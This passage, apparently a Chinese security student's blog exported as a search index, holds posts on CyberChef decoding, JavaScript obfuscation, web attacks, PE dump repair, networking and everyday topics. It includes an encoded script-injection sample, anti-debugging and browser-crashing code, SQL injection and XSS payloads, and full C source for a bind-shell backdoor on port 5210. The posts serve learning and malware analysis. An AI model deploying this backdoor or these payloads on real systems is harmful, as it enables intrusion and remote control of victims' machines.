100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 118, 97, 114, 32, 110, 116, 51, 32, 61, 32, 116, 114, 117, 101, 59, 32, 102, 111, 114, 32, 40, 32, 118, 97, 114, 32, 105, 32, 61, 32, 97, 108, 108, 115, 46, 108, 101, 110, 103, 116, 104, 59, 32, 105, 45, 45, 59, 41, 32, 123, 32, 105, 102, 32, 40, 97, 108, 108, 115, 91, 105, 93, 46, 115, 114, 99, 46, 105, 110, 100, 101, 120, 79, 102, 40, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 48, 49, 44, 32, 49, 50, 48, 44, 32, 57, 55, 44, 32, 49, 48, 57, 44, 32, 49, 48, 52, 44, 32, 49, 49, 49, 44, 32, 49, 48, 57, 44, 32, 49, 48, 49, 41, 41, 32, 62, 32, 45, 49, 41, 32, 123, 32, 110, 116, 51, 32, 61, 32, 102, 97, 108, 115, 101, 59, 125, 32, 125, 32, 105, 102, 40, 110, 116, 51, 32, 61, 61, 32, 116, 114, 117, 101, 41, 123, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 34, 104, 101, 97, 100, 34, 41, 91, 48, 93, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 41, 59, 32, 125)); 首先使用正则表达式([0-9]{2,3}(,s|))+筛选char型，然后使用From Charcode对字符串进行转换，在转换前需要将间隔符Delimiter选为Comma（逗号），Base选为10进制，就可以解密出恶意代码了。\n泪目了，早用上这个东西也不至于一个个对着ASCII码表替换了，和上古时代的电报员一样。\n循环解密 在Operation中的Flow control中将Label拖到最前面，Jump拖到最后面，Jump的地址为Label的name，Maxmium jumps为要循环的次数，即可进行循环解密。\n总结 CyberChef 可以简单理解成一个脚本解密工具的集合，除此之外，它其实还有很多黑科技，比如解析网络数据包里的数据、解析图片的地理位置及时间信息等。\n","date":"2024-07-10T10:05:48+08:00","permalink":"https://wander1ng.com/post/%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E7%A5%9E%E5%99%A8cyberchef%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/","section":"post","tags":["Coding"],"title":"数据处理神器Cyberchef使用指南"},{"categories":null,"contents":"在 Python 中，使用按位与运算符 \u0026amp; 来连接多个条件在 if 语句中不是常见做法。如果你实际上是想判断多个布尔表达式的逻辑与，即 a、b、c 都为真时执行某个代码块，那么你应该使用逻辑与 and 运算符。\n使用逻辑与 and 运算符 当使用 and 时，Python 会从左到右依次计算每个条件。如果其中任何一个条件为 False，则整个表达式为 False，并且后续的条件将不会被计算，程序直接跳到 else 代码块。这种行为被称为 “短路” (short-circuit) 评估。\na = True\rb = False\rc = True\rif a and b and c:\rprint(\u0026#34;All conditions are True\u0026#34;)\relse:\rprint(\u0026#34;One or more conditions are False\u0026#34;) 在这种情况下，由于 b 是 False，所以 c 不会被计算，程序直接进入 else 代码块，输出：\nOne or more conditions are False 使用按位与 \u0026amp; 运算符 按位与运算符 \u0026amp; 对左右两边的操作数逐位执行按位与运算，不进行布尔运算。用于条件判断时，它会对所有操作数进行计算，而不会 “短路”。\na = True\rb = False\rc = True\rif a \u0026amp; b \u0026amp; c:\rprint(\u0026#34;All conditions are True\u0026#34;)\relse:\rprint(\u0026#34;One or more conditions are False\u0026#34;) 在这种情况下，虽然 b 是 False，但 a、b、c 都会被计算。因为 b 为 False，所以结果仍然是 False， 程序会进入 else 代码块，输出：\nOne or more conditions are False 小结 逻辑与 and: 如果任何一个条件为 False，则不会计算后续条件，直接跳到 else（短路评估）。 按位与 \u0026amp;: 对所有条件进行位运算，不会短路。如果要判断多个布尔条件应使用 and。 总的来说，在逻辑判断中使用 and 是更为合理和常见的做法，因为它能够利用短路评估来提高代码的效率。\nif a and b and c:\r# 执行所有条件都为真的情况\r... 这会在找到第一个 False 时立即停止后续的判断，从而提高代码效率。\n","date":"2024-07-09T14:22:49+08:00","permalink":"https://wander1ng.com/post/python%E4%B8%AD%E7%9A%84%E7%9F%AD%E8%B7%AF%E8%AF%84%E4%BC%B0/","section":"post","tags":["Coding"],"title":"Python中的短路评估"},{"categories":null,"contents":"6.29殷墟博物馆+殷墟王陵遗址+殷墟宗庙遗址 6.30中国文字博物馆+万佛沟+修宁寺塔 ","date":"2024-07-07T12:25:03+08:00","permalink":"https://wander1ng.com/post/%E5%AE%89%E9%98%B3%E6%B8%B8%E8%AE%B0/","section":"post","tags":["travel"],"title":"安阳游记"},{"categories":null,"contents":"JavaScript 混淆（Obfuscation）是指通过一系列技术手段，使 JS 代码变得难以理解和分析，增加代码的复杂性和混淆度，阻碍逆向工程和代码盗用。实际上就是一种保护 JS 代码的手段。JS最早被设计出来就是为了在客户端运行，直接以源码的形式传递给客户端，如果不做处理则完全公开透明，任何人都可以读、分析、复制、盗用，甚至篡改源码与数据，这是网站开发者不愿意看到的。\n压缩工具开发的初衷是减小 JS 文件体积，但 JS 代码经过压缩替换后，其可读性也大大降低，间接起到了保护代码的作用。但是后来主流浏览器的开发者工具都提供了格式化代码的功能，压缩技术所能提供的安全保护收效甚微。于是专门保护 JS 代码的技术：JS 加密和 JS 混淆。\n常见混淆手段 变量名/函数名的替换，将有意义的变量名函数名替换为随机生成的名称\n/*\rfunction calculateArea(radius) {\rreturn Math.PI * radius * radius;\r}\rconsole.log(calculateArea(5));\r*/\rfunction _0x2d8f05(_0x4b083b) {\rreturn Math.PI * _0x4b083b * _0x4b083b;\r}\rconsole.log(_0x2d8f05(5)); 字符串混淆，将代码中的字符串替换为编码或加密的形式，可以防止字符串被轻易读取。\n// console.log(\u0026#34;Hello, world!\u0026#34;);\rconsole.log(\u0026#34;\\x48\\x65\\x6c\\x6c\\x6f\\x2c\\x20\\x77\\x6f\\x72\\x6c\\x64\\x21\u0026#34;); 控制流混淆，改变代码的执行顺序或结构。例如，可以使用条件语句和循环语句来替换简单的赋值操作。\n/*\rlet a = 1;\rlet b = 2;\rlet c = a + b;\rconsole.log(c);\r*/\rlet a = 1;\rlet b = 2;\rlet c;\rif (a === 1) {\rif (b === 2) {\rc = a + b;\r}\r}\rconsole.log(c); 花指令，即在源码插入一些不会被执行的代码。\n/*\rlet a = 1;\rlet b = 2;\rlet c = a + b;\rconsole.log(c);\r*/\rlet a = 1;\rlet b = 2;\rif (false) {\rconsole.log(a - b);\r}\rlet c = a + b;\rconsole.log(c); 代码转换，将代码转换为等价的，但更难理解的形式。\n/*\rlet a = 1;\rlet b = 2;\rlet c = a + b;\rconsole.log(c);\r*/\rlet a = 1;\rlet b = 2;\rlet c = a - (-b);\rconsole.log(c); 常见反调试手段 实现防止他人调试、动态分析自己的代码，我们可以预先在代码中做处理，防止用户调试代码。\n无限 debugger。比如写个定时器死循环禁止调试。\nvar c = new RegExp(\u0026#34;1\u0026#34;);\rc.toString = function () {\ralert(\u0026#34;检测到调试\u0026#34;)\rsetInterval(function() {\rdebugger\r}, 1000);\r}\rconsole.log(c); 内存耗尽。更隐蔽的反调试手段，代码运行造成的内存占用会越来越大，很快会使浏览器崩溃。\nvar startTime = new Date();\rdebugger;\rvar endTime = new Date();\rvar isDev = endTime - startTime \u0026gt; 100;\rvar stack = [];\rif (isDev) {\rwhile (true) {\rstack.push(this);\rconsole.log(stack.length, this);\r}\r} 检测函数、对象属性修改。攻击者在调试的时，经常会把防护的函数删除，或者把检测数据对象进行篡改。可以检测函数内容，在原型上设置禁止修改。\nfunction eval() {\r[native code]\r}\rwindow.eval = function(str) {\rconsole.log(\u0026#34;[native code]\u0026#34;);\r};\rwindow.eval = function(str) {\r};\rwindow.eval.toString = function() {\rreturn `function eval() {[native code]}`\r};\rfunction hijacked(fun) {\rreturn \u0026#34;prototype\u0026#34; in fun || fun.toString().replace(/\\n|\\s/g, \u0026#34;\u0026#34;) != \u0026#34;function\u0026#34; + fun.name + \u0026#34;() {[nativecode]}\u0026#34;;\r} 在线混淆工具 反混淆 JS 反混淆（Deobfuscator ）是指对经过混淆处理的代码进行还原和解析，以恢复其可读性。Deobfuscator 可以通过对代码进行静态分析和动态分析等方式来实现。需要注意的是，Obfuscation 只能降低可读性，不能完全避免逆向攻击，而 Deobfuscator 也并不能完全还原混淆过的代码。\n在线反混淆工具 以及浏览器前端中的Source窗口，配合console.log（）函数非常好用。\n目前的需求是，一段经过混淆的恶意代码，能否直接在前端执行出解混淆后的结果。目前认知来看只有编码类混淆可以，而且存在执行到C2的风险。\n","date":"2024-07-05T15:35:25+08:00","permalink":"https://wander1ng.com/post/%E5%B8%B8%E8%A7%81javascript%E6%B7%B7%E6%B7%86%E4%B8%8E%E5%8F%8D%E6%B7%B7%E6%B7%86/","section":"post","tags":["Coding"],"title":"常见JavaScript混淆与反混淆"},{"categories":null,"contents":"二〇二四 六月 安阳 二〇二四 六月 中国考古博物馆 二〇二四 六月 China PE 二〇二四 六月 海南 碧海青天夜夜心\n二〇二四 五月 内蒙古 二〇二四 四月 UCAA-杉本博司：无尽的刹那 二〇二四 三月 奥林匹克森林公园/牛街 二〇二四 三月 沈阳 二〇二四 二月 南京苏州杭州青岛 ","date":"2024-07-05T11:28:56+08:00","permalink":"https://wander1ng.com/post/%E6%91%84%E5%BD%B1%E4%BD%9C%E5%93%81%E5%B0%8F%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/","section":"post","tags":["Photograph"],"title":"摄影作品小记(持续更新中)"},{"categories":null,"contents":"岑樱\n北洛\n乌衣国\n神话中的燕子之国。宋张敦颐《六朝事迹．乌衣巷》:\u0026ldquo;王榭，金陵人，世以航海为业。一日，海中失船，泛一木登岸，见一翁一妪皆衣皂，引榭至所居，乃乌衣国也。以女妻之，既久，榭思归，复乘云轩泛海至其家，有二燕栖于梁上……来春，燕又飞来榭身上，有诗云:\u0026lsquo;昔日相逢冥数合，如今暌远是生离。来春纵有相思字，三月天南无雁飞。\u0026rsquo;\u0026ldquo;宋戴复古《燕》诗:\u0026ldquo;闻说乌衣国，低连海上村。\u0026ldquo;金庞铸《田器之燕子图》诗:\u0026ldquo;乌衣之国定何许，一双燕子能飞来。\u0026ldquo;后因以之为男女结合之地的典实。\n","date":"2024-07-05T11:26:32+08:00","permalink":"https://wander1ng.com/post/%E5%8F%A4%E5%89%91%E5%A5%87%E8%B0%AD%E4%B8%89%E5%B0%8F%E8%AE%B0/","section":"post","tags":["Game"],"title":"《古剑奇谭三》小记(持续更新中)"},{"categories":null,"contents":"1.首先创建Github库\n2.安装hugo：\nhttps://github.com/gohugoio/hugo/releases 3.下载后记得将hugo.exe路径加入系统环境变量，测试是否安装成功：\nhugo version 4.使用hugo创建博客目录\nhugo new site blogname 5.在系统中创建博客目录，并git init，配置好git的config文件。\n6.选择hugo主题，并使用git clone将主题下载到本地，本网站选择的主题是https://github.com/heyeshuang/hugo-theme-tokiwa.git，第一眼看到便想到莫奈的《日出·印象》。\n7.新建文章\nhugo new post/first-post.md\n8.在hugo网站的根目录下执行hugo进行编译，启动本地预览,打开网址 http://localhost:1313/ 可以进行预览hugo server -D\n9.部署到GitHub\ngit add .\rgit commit -m \u0026#34;xxx\u0026#34;\rgit push https://github.com/username/projectname master(main) 10.在Godaddy或其他网站购买域名\n11.将域名托管到Cloudflare，左边导航栏进入Websites\nadd site\n记得选free plan\n随后在Godaddy设置域名DNS为Cloudflare的DNS服务器地址\n随后等待DNS解析成功，邮箱将会收到邮件通知\n在Cloudflare创建pages并连接到Git，选择最开始在Git中新建的blog目录\n随后博客文件将部署到Cloudflare上\n最后自定义域名，即将域名DNS记录指向Pages\n踩的坑\nHugo server -D的意思是忽略draft=true，即draft属性为true的md文件也会被渲染编译。折磨了一天的问题是“为什么本地能够编译出文章，但是部署到Github上就消失了？”因为实际部署的时候draft=true的文件是不显示的。\n域名的CNAME要解析到项目的别名/Aliases，一键交给Cloudflare添加的CNAME可能不是实际的Aliases，需要手动修改DNS添加上master。\n","date":"2024-06-27T18:02:59+08:00","permalink":"https://wander1ng.com/post/hugo+cloudflare%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%8C%87%E5%8D%97/","section":"post","tags":["Blog"],"title":"Hugo+CloudFlare搭建博客指南"},{"categories":null,"contents":"SQL注入漏洞 SQL注入的原理：用户输入的数据被解释器执行\nSQL注入的分类\n数字型注入：多出现在ASP/PHP等弱语言中，弱类型语言会自动推导变量类型。例如id=8，PHP自动推导变量id的数据类型为int类型。id=8 and 1=1，则会推导为string类型，这是弱语言类型的特性。强类型语言的数字型注入漏洞会比弱类型语言少很多。 字符型注入：输入参数为字符串时，称为字符型注入。最大区别在于：数字型注入不需要单引号闭合，字符串类型一般要使用单引号来闭合。字符型注入最关键的是如何闭合SQL语句以及注释多余的代码。当查询内容为字符串时，SQL代码如下select * from table where username = 'admin'，当攻击者进行SQL注入时，直接输入select * from table where username = 'admin and 1=1' 会被当成查询语句，此处想要注入必须注意字符串闭合问题：select * from table where username = 'admin' and 1=1 -- SQL注入的分类：POST注入，即注入字段在POST数据中。Cookie注入，注入字段在Cookie数据中。延时注入，使用数据库延时特性注入。搜索注入，注入处为搜索的地点。base64注入，注入字符串需要经过base64加密。 上传漏洞 XSS跨站脚本漏洞 XXS又叫CSS即Cross Site Scripting，即跨站脚本攻击。指的是攻击者在网页中嵌入客户端脚本，通常是JS编写的恶意代码。当用户使用浏览器浏览该网页时，恶意代码将会被用户的浏览器执行。\nJS加载外部的代码文件可以是任意扩展名（无扩展名也可以），如\u0026lt;script src=\u0026quot;http://www.secbug.org/x.jpg\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;，即使文件为图片扩展名x.jpg，只要其中包含JS代码就会被执行。\nXSS的分类\n反射型XSS，也称非持久性XSS。当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器。浏览器引擎解析执行这段带有XSS代码的数据后，最终造成XSS漏洞，这个过程就像一次反射故称反射型XSS。如?php $username = $_GET['username'];echo $username; ?\u0026gt;这段代码中，程序接受username值后再输出。如果输入username=\u0026lt;script\u0026gt;恶意代码\u0026lt;/script\u0026gt;，将会造成反射型XSS漏洞。 存储型XSS，又被成为持久性XSS，是最危险的一种跨站脚本。允许用户存储数据的Web应用程序都可能会出现存储型XSS。攻击者提交XSS代码到服务器后，被服务端接受并存储。攻击者再次访问某个页面是，这段恶意代码被程序读出来响应给浏览器引擎执行。存储型与反射型、DOM型相比，具有较高的隐蔽性和危害性，最大的区别在于反射型和DOM型都必须依靠用户手动触发，存储型不需要。在测试是否存在XSS时，首先要确定输入点和输出点。 命令执行漏洞 文件包含漏洞 其它漏洞 ","date":"2022-01-08T15:19:02+08:00","permalink":"https://wander1ng.com/post/%E6%95%B4%E7%90%86%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80web%E7%9F%A5%E8%AF%86/","section":"post","tags":["技术"],"title":"整理一些基础Web攻防知识"},{"categories":null,"contents":"​\t对于多阶段释放的样本，可以扔进xdbg，在回连C2的函数下断。找到断下来的地址空间，不是shellcode的话就是一个完整的PE，如果是PE，直接dump出来，修复导入导出表后便能在IDA中分析。\n​\t看修复过程的操作主要涉及对VirtualAddress和Relative VirtualAddress的处理，顺便学习一下内存对齐的原理。\n对于内存空间的任意值， 有：\nVirtualAddress：进程虚拟内存的绝对地址。\nRelativeAddress：从某个ImageBase开始的相对地址。\nImageBase+RVA=VirtualAddress。\n对于PE文件从磁盘到内存映射：\n由于PE文件在磁盘上和在内存中的对齐颗粒度不同，会导致同一个PE文件在磁盘上有两个不同的偏移。FOV：文件偏移，RVA内存偏移。\nPE扩展头中定义了内存对齐颗粒度SectionAlignment和文件对齐颗粒度FileAlignment。\n相互转换的方法：差值=RVA-节VirtualAddress(内存对齐值)，FOV=节PointerToData值(文件偏移对齐值)。\n对齐 经典的文件对齐值：200h，X86内存对齐：1000h。\nSectionAlignment定义了内存中区块的对齐值，PE文件被映射到内存中时，区块总是至少从一个页的边界开始。\n对齐的原因 现代计算机中内存空间都是按照字节(byte)进行划分的，所以从理论上讲对于任何类型的变量访问都可以从任意地址开始，但是在实际情况中，在访问特定类型变量的时候经常在特定的内存地址访问，所以这就需要把各种类型数据按照一定的规则在空间上排列，而不是按照顺序一个接一个的排放，这种就称为内存对齐，内存对齐是指首地址对齐，而不是说每个变量大小对齐。\n对齐参数 即对齐的最小单位。假如对齐参数是8字节，那4字节的需要填充4字节00h到8字节，36字节需要填充4字节的00h到40字节。\n","date":"2020-12-30T12:27:23+08:00","permalink":"https://wander1ng.com/post/%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%AE%E5%A4%8D%E5%8E%9F%E7%90%86/","section":"post","tags":["基础"],"title":"转储文件的修复原理"},{"categories":null,"contents":"大端序：高位字节在前(低地址)，低位字节在后(高地址)，属于人类读写数值的方法。\n**小端序：**低位字节在前(低地址)，高位字节在后(高地址)，属于计算机读写数值的方式。\n原因 首先，为什么会有小端字节序？\n答案是，计算机电路先处理低位字节，效率比较高，因为计算都是从低位开始的。所以，计算机的内部处理都是小端字节序。但是，人类还是习惯读写大端字节序。所以，除了计算机的内部处理，其他的场合几乎都是大端字节序，比如网络传输和文件储存。\n处理方式 一般字节序的问题由外部设备处理，即由从存储中进行读取的设备处理。\n对于大端序：\nx = buf[offset]\u0026lt;\u0026lt;8 | buf[offset+1];\n符合人类理解，低地址存放的高位乘以位数，或运算把低位加上去。\n对于小端序：\nx = buf[offset+1] * 256 + buf[offset];\n高地址存放的高位乘以位数，再把低地址存放的低位加上去。\n","date":"2020-12-20T11:06:11+08:00","permalink":"https://wander1ng.com/post/%E5%A4%A7%E7%AB%AF%E5%BA%8F%E4%B8%8E%E5%B0%8F%E7%AB%AF%E5%BA%8F/","section":"post","tags":["Meta"],"title":"大端序与小端序"},{"categories":null,"contents":"​\t提高样本分析能力，最重要的事情之一就是先正向编写木马。之前简单编译过一个程序，今天搜了一个非常简单的后门，比较一下反编译的结果和源码的区别。\n​\t源码如下。\n#pragma comment(lib,\u0026#34;ws2_32.lib\u0026#34;) //这里我们静态加入一个lib文件，也就是ws2_32.lib\u0026lt;/font\u0026gt;\r#pragma comment(linker,\u0026#34;/subsystem:\\\u0026#34;windows\\\u0026#34;/entry:\\\u0026#34;mainCRTStartup\\\u0026#34;\u0026#34;) //设置连接器选项\r#include \u0026lt;winsock2.h\u0026gt; //包含头文件winsock2.h,这个是 windows socket的头文件\r#include \u0026lt;windows.h\u0026gt; //常用的，不解释\r#define MasterPort 5210 //定义一个常量，也就是我们后面要打开的端口\rmain() //主函数不解释\r{\rWSADATA WSADa; //这个结构被用来存储被WSAStartup函数调用后返回的Windows Sockets数据。后面的基本上差不多就不解释，不懂请大家自行百度\rsockaddr_in SockAddrIn; SOCKET CSocket,SSocket;\rint iAddrSize;\rPROCESS_INFORMATION ProcessInfo;\rSTARTUPINFO StartupInfo;\rchar szCMDPath[255];\r//分配内存，初始化数据\rZeroMemory(\u0026amp;ProcessInfo,sizeof(PROCESS_INFORMATION));\rZeroMemory(\u0026amp;StartupInfo,sizeof(STARTUPINFO));\rZeroMemory(\u0026amp;WSADa,sizeof(WSADATA));\r//获取cmd路径\rGetEnvironmentVariable(\u0026#34;COMSPEG\u0026#34;,szCMDPath,sizeof(szCMDPath));\r//加载ws2_32.dll\rWSAStartup(0x0202,\u0026amp;WSADa);\r//设置本地信息和绑定协议,建立socket,代码如下:\rSockAddrIn.sin_family = AF_INET;\rSockAddrIn.sin_addr.s_addr = INADDR_ANY;\rSockAddrIn.sin_port = htons(MasterPort);\rCSocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);\r//设置绑定端口，将SockAddrIn绑定到CSocket。\rbind(CSocket,(sockaddr *)\u0026amp;SockAddrIn,sizeof(SockAddrIn));\r//设置服务器端监听端口\rlisten(CSocket,1);\riAddrSize = sizeof(SockAddrIn);\r//开始连接远程服务器，并配置隐藏窗口结构体\rSSocket = accept(CSocket,(sockaddr *)\u0026amp;SockAddrIn,\u0026amp;iAddrSize);\rStartupInfo.cb = sizeof(STARTUPINFO);\rStartupInfo.wShowWindow = SW_HIDE;\rStartupInfo.dwFlags = STARTF_USESTDHANDLES |\rSTARTF_USESHOWWINDOW;\rStartupInfo.hStdInput = (HANDLE)SSocket;\rStartupInfo.hStdOutput = (HANDLE)SSocket;\rStartupInfo.hStdError = (HANDLE)SSocket;\r//创建匿名管道：\rCreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, \u0026amp;StartupInfo, \u0026amp;ProcessInfo);\rWaitForSingleObject(ProcessInfo.hProcess, INFINITE);\rCloseHandle(ProcessInfo.hProcess);\rCloseHandle(ProcessInfo.hThread);\r//关闭进程句柄：\rclosesocket(CSocket);\rclosesocket(SSocket);\rWSACleanup();\r//关闭连接卸载ws2_32.dll\rreturn 0;\r} 实际IDA反编译出来的效果如下：\n可以看到反编译的结果，库的导入和局部变量的定义是没有的，应该是编译过程中，在链接操作之前这些就已经执行完成了。\n简单来说这个程序的功能就是开放5210端口，并监听。然后把输入重定向到新起cmd进程，并把cmd进程的输出重定向到5210端口。\n对64位下传参的测试 传4个参数及以下，使用的是寄存器传参，cd89，第一个参数传到c，第二个参数传到d，第三个参数传到8，第四个参数传到9。从顺序上来看，从右往左，先从第四个开始传，再从第三个开始传\u0026hellip;\n传5个参数及以上，前四个使用寄存器传参，从第五个开始使用堆栈传参(上图是传完了之后的结果，汇编侧可以看到寄存器的使用)。可以看到第五个参数先使用了寄存器将参数从rbp-14h中取出来(寻址方式。反映变化趋势的方面，栈由高地址向低地址生长，参数由低地址向高地址生长。x64dbg的上面是栈顶低地址下面是栈底高地址)。\n然后又赋给了rsp+20，最后把eax中存放的第一个参数赋给ecx。\n比较奇怪的是为什么不在栈顶。\n","date":"2020-11-26T20:11:59+08:00","permalink":"https://wander1ng.com/post/%E4%BB%8E%E6%AD%A3%E5%90%91%E6%9C%A8%E9%A9%AC%E7%BC%96%E5%86%99%E7%9C%8B%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/","section":"post","tags":["技术"],"title":"从正向木马编写看逆向工程"},{"categories":null,"contents":"学计网的时候有些头大,找到了这篇文章,首先对整体有一个认识,再换一本书,机械工业出版社的《Computer Networking A Top-Down Approach》.\n序 互联网的核心是一系列协议,总称为互联网协议:Internet Protocol Suite.它们对电脑如何连接和组网,做出了详尽的规定.理解了这些协议的规定,就理解了互联网的原理.\n概述 五层模型 自顶向下分别为应用层Application Layer,传输层Transport Layer,网络层Network Layer,链路层Link Layer和物理层Physical Layer.越下面的层越靠近硬件,越上面的层越靠近用户.\n层与协议 每一层都是为了完成某一种功能,为了实现这些功能就要传输时遵循共同的规则protocol.互联网的每一层都定义了很多协议,这些协议的总称为互联网协议.\n物理层 电脑要组网,首先就要先把电脑连接起来,可以用光缆,线缆,双绞线和无线电波等方式(咋和谢希仁版有点不一样?还是我记错了).这就叫做物理层.它主要规定了网络的一些电气特性,作用是负责传输0和1的电信号.\n链路层 定义 单纯的0和1并没有意义,必须规定其解读方式:多少个电信号算一组,每个信号有何意义?链路层的功能就是在实体层的上方确定0和1的分组方式.\n以太网协议 Ethernet规定,一组电信号构成一个数据包叫做帧(Frame).每一帧分为两个部分:标头Head与数据Data.Head包含数据包的一些说明项,如发送者,接收者,数据类型.数据则是数据包的具体内容.\n标头的长度固定为18字节,数据的长度最短为46字节,最长为1500字节.因此对于一帧来说,大小区间为64-1518字节.数据过长则分为多个帧发送.\nMAC地址 传输数据的过程中要标识发送者与接收者,就要使用到MAC地址.Ethernet规定连入网络的所有设备都必须有网卡接口,**数据包必须是从一块网卡传送到另一块网卡.网卡的地址就是数据包的发送地址与接收地址即MAC地址.**每块网卡出场时都有一个唯一的MAC地址,长度为48个二进制位,常用12个16进制数表示.前6个位厂商编号,后六个为该厂商网卡流水号.\n广播 一块网卡要知道另一块网卡的MAC地址,要使用到ARP协议(在谢希仁版中自学过,现在又给忘了\u0026hellip;);\n知道MAC地址之后,系统怎样才能把数据包准确送到接收方?**Ethernet并不把数据包准确送到接收方,而是向本网络所有计算机发送,让计算机自己判断是否为接收方.**而向本网络所有计算机发包的行为,就叫做广播broadcasting.\n网络层 网络层的由来 根据Ethernet协议,依靠MAC地址发送数据,理论上和技术上世界上任何一个地方的网卡都能够找到任何一个地方的网卡.但是这样做有一个巨大的缺点\u0026quot;以太网采用广播的方式发送数据包,每个成员都会收到所有的包.不仅效率低,而且只能在发送者的子网络中传播.(如果互联网上每一台计算机都收到所有的包不可想象).\n所以必须找到一种方法,能够区分MAC地址是否属于一个子网络.如果属于一个子网络,采用广播的形式发送,否则采用路由(路由即向不同的子网络分发数据包).而MAC地址只与厂商有关与网络无关,所以网络层诞生了.\n它的作用是引进一套新的地址,使我们能够区分不同的计算机是否属于一个子网络.\n于是网络层出现后,每台计算机就有了两种地址,一种是MAC地址,另一种是网络地址(二者之间无任何联系).网络地址帮助我们确定计算机所在的子网络,MAC地址则将数据包送到该子网络的目标网卡.所以从逻辑上看一定是先处理网络地址,再处理MAC地址.\nIP协议 根据网络地址的协议就叫做IP协议,其定义的地址就叫做IP地址.IP地址由网络号和主机号组成.处于一个子网络的电脑,其IP地址的网络部分必定是相同的.主机部分是对同处该子网的主机进行编号.\n为了从IP地址判断出两台计算机是否处于同一个子网,就要用到另一个参数\u0026quot;子网掩码\u0026ldquo;即subnet mask.子网掩码使表示子网特征的一个参数,在形式上等同于IP地址,也是一个32位二进制数字.其网络部分全为1,主机部分全为0.\n知道IP地址与子网掩码判断是否属于同一个子网的方法:将两个IP地址分别于子网掩码进行AND运算,结果相同则在一个子网.\n已知IP地址172.16.154.1和172.16.254.233子网掩码都是255.255.255.0,请问其是否在一个子网?\n总结IP协议的作用:一是为每台计算机分配IP地址,另一个是为确定哪些地址处于一个子网.\nIP数据报 根据IP协议发送的数据,就叫做IP数据报.但是Ethernet数据报只包含MAC地址,并没有IP地址的栏位,是否要修改数据报定义,再添加一个栏位?回答是不需要,因为可以直接将IP数据报放进Ethernet数据报的数据部分.这就是互联网分层结构的好处:上层变动完全不涉及下层结构.\nIP数据报的标头(特指不在Head中而在Data中的关于IP信息的Head)长度一般在20-60字节,整个数据报的长度最大为65535字节.Ethernet数据报的数据部分,最长只有1500字节,所以如果IP数据报超过了1500字节,就要分割成几个Ethernet数据报分开发送.\nARP协议 IP数据报是放在以太网数据报里发送的.所以必须同时知道两个地址,一个是对方的MAC地址,一个是对方的IP地址.通常情况下对方的IP地址是已知的,但是MAC地址未知.所以需要一种基址从IP地址得到MAC地址.\n第一种情况,两个主机不在一个子网,则事实上无法得到对方的MAC地址,只能将数据包传送到两个子网连接处的网关,让网关进行处理.\n第二种情况,两个主机在一个子网,则使用ARP协议.ARP协议发出一个数据报,其中包含所要查询的IP地址,在对方的MAC地址这一栏,填的是FF:FF:FF:FF:FF:FF,表示这是一个广播地址.他所在的子网络的每一台主机,都会收到这个数据报.从中取出IP地址,与自身IP地址进行比较,如果两者相同,则做出回复向对方报告MAC地址,否则就丢弃这个包.\n传输层 有了MAC地址和IP地址,就可以在互联网上任意两台主机建立通信.但是同一台主机上有许多程序都要使用到网络,那么就需要一个参数来表示这个数据包到底供哪个进程使用,这个参数就叫做端口.它其实是每一个使用网卡的程序的编号,每个数据报都发送到主机的特定端口,这样不同的程序就能够取到自己所需要的数据.\n端口是0到65535之间的一个整数,正好16个二进制位.0到1023的端口被系统占用,用户只能选择大于1023的端口.\n传输层的功能是建立端口到端口之间的通信,相比之下网络层是建立主机到主机之间的通信.只要确定主机和端口,就能实现程序之间的交流.因此Unix就把主机+端口,叫做\u0026quot;套接字\u0026quot;socket.\nUDP协议 现在我们要在数据报中加入端口信息,这就需要新的协议.最简单的实现叫做UDP协议,它的格式就是在数据前面加上端口号.\nHead部分主要定义了发出端口与接收接口,其数据报非常简单,Head部分8个字节,总长度不超过65535字节,正好放进一个IP数据报.数据部分就是具体的内容然后把整个UDP数据报放入IP数据报的数据部分.所以整个Ethernet数据报变成了下面这样:\nTCP协议 UDP协议的优点在于比较简单,容易实现.但是缺点在于一旦数据报发出,无法知道对方是否知道.为了提高网络可靠性,TCP协议就诞生了.这个协议非常复杂,但可以近似认为它是有确认机制的.因此TCP协议能够确保数据不会丢失,但是实现困难,资源消耗较多.\nTCP数据报和UDP数据报一样,都是内嵌在IP数据报的数据部分.TCP数据报没有长度限制,理论上可以无限长.但是为了保证网络的效率,通常TCP数据报的长度不会超过IP数据报的长度,确保单个TCP数据报不必再被分割.\n应用层 应用程序收到传输层的数据,接下来就要进行解读.由于互联网是开放架构,所以必须先规定好格式.**应用层的作用,就是规定应用程序的数据格式.**举例来说,TCP协议可以为各种各样的程序传递数据,Email/WWW/FTP等,必须有不同协议规定电子邮电,网页和FTP数据的格式,这些应用程序协议就构成了应用层.这是最高的一层,直接面对用户.其数据就在TCP数据报的数据部分,因此现在的Ethernet变成了下面这样:\n网络通信的实质就是交换上面的数据报.\n对于不在一个子网的两台计算机之间的通信(假设1号电脑要向4号电脑发送数据报),则1号电脑需要知道网关A的MAC地址(和4号电脑的IP地址).1号电脑发出数据报到网关A,网关A通过路由协议发现4号电脑位于网络B,又把数据报发给网关B,B再转发到4号电脑.\n判断是否处于同一子网的方法 静态IP地址 